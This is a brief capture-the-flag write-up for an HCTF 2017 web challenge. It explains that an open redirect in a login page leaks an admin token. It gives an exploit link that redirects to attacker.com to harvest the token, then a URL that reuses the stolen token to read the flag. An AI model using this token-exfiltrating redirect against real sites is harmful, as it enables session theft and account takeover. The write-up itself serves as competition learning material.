My first thoughts was the XSS in JSONP, but later found there was an open redirect when login. And admin's token will be attached to the redirected address.

Just report the following link:

`http://auth.2017.hctf.io/login.php?n_url=http://attacker.com/`

After harvesting the token, visit `http://messbox.2017.hctf.io/?token=MTYwMTAwOTAwMDljNzA4MHxhR04wWmw5aFpHMXBibDlNYjFKbGVIaGhjakpsTWpNek1qST0=` and the flag can be found in cookies.

The XSS was likely for _Restored Again_.
